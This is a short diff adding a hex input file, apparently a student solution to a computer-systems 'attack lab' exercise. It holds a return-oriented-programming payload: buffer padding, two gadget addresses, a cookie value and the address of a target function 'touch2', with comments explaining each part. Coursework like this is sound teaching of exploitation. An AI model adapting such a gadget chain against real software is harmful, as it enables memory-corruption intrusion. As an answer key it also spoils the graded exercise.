@@ -1,0 +1,7 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* first 24(buffer size) bytes here are just padding */
+64 16 40 00 00 00 00 00 /* gadget 1: popq %rax address starts at last byte */
+65 7a 18 1c 00 00 00 00 /* cookie */
+4e 16 40 00 00 00 00 00 /* gadget 2: move %rax to %rdi */
+8a 14 40 00 00 00 00 00 /* touch2 address
